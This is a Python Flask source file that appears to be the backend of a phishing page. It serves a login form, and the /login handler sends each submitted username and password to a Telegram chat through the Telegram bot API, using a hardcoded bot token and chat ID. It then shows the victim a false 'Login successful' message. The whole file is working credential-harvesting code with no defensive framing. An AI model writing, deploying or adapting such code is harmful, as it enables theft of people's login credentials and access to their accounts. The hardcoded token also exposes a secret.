from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# Replace these with your Telegram bot token and chat ID
BOT_TOKEN = "8273890387:AAG8BbidwS-UkY_Ct-bdmbFbHq6xr_qdBqM"
CHAT_ID = "6291023089"

# Load index.html as template
with open("index.html", "r") as f:
    template = f.read()

@app.route("/", methods=["GET"])
def home():
    return render_template_string(template)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    if not username or not password:
        return "Please enter both username and password", 400

    # Send credentials to Telegram
    message = f"New Login:\nUsername: {username}\nPassword: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}

    try:
        requests.post(url, data=payload)
    except Exception as e:
        print("Telegram send failed:", e)

    # Show a simple response after login
    return "Login successful! Thank you."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
